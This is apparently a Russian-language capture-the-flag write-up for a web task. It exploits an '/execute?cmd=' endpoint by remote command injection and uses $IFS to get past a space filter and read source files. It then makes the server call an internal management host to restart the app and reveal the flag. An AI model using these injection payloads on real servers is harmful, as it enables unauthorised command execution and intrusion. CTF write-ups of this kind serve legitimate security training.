# Планетарная важность

В этом задании нам предстоит перезагрузить сайт. Просмотрев исходный HTML главной страницы, наше внимание сразу привлекает данный фрагмент JS кода:

```js
$('#statusButton').click(function () {
    $.get('/execute?cmd=get-status', function (data) {
        $('.result').text(data);
        $('.modal').show();
    });
});
```

Исходя из названий, складывается впечатление, что при нажатии на кнопку, на сервер отправляется команда для выполнения, а затем возвращается результат. Давайте проверим:

```bash
$ curl https://its-broken-jncn4dyj.spbctf.ru/execute?cmd=pwd
/home/app
```

Ура так, и есть! Теперь надо осмотреться:

```bash
$ curl https://its-broken-jncn4dyj.spbctf.ru/execute?cmd=ls
README.md
main.py
requirements.txt
templates
```

И получим исходники:

```bash 
$ curl -G https://its-broken-jncn4dyj.spbctf.ru/execute --data-urlencode 'cmd=cat main.py'
/bin/sh: 1: cat+main.py: not found
```

Не беда, обойдем с помощью переменной IFS (Internal Field Separator):

```bash
$ curl 'https://its-broken-jncn4dyj.spbctf.ru/execute?cmd=cat$IFS"main.py"'
import subprocess
from urllib.parse import urlparse

from flask import Flask, request, render_template, abort, redirect, url_for

app = Flask(__name__)
...

```

Ничего интересного, а вот в **README.md** содержит инструкцию к перезагрузке:

    Для перезагрузки приложения выполните

    ```bash
    curl http://management:5000/restart/
    ```

```bash
$ curl 'https://its-broken-jncn4dyj.spbctf.ru/execute?cmd=curl$IFS"http://management:5000/restart/">/tmp/h;'
$ curl 'https://its-broken-jncn4dyj.spbctf.ru/execute?cmd=cat$IFS/tmp/h;'
Success! Go to /060648ac9456adba9740f7b2b119abf2bcf194c2/ to get flag

$ curl https://its-broken-jncn4dyj.spbctf.ru/060648ac9456adba9740f7b2b119abf2bcf194c2/ | grep its
<p class="result">its{yoU_54VED_hUMaNi7Y_fRoM_A_MEt3or173_FAll_w17h_RcE}</p>
```
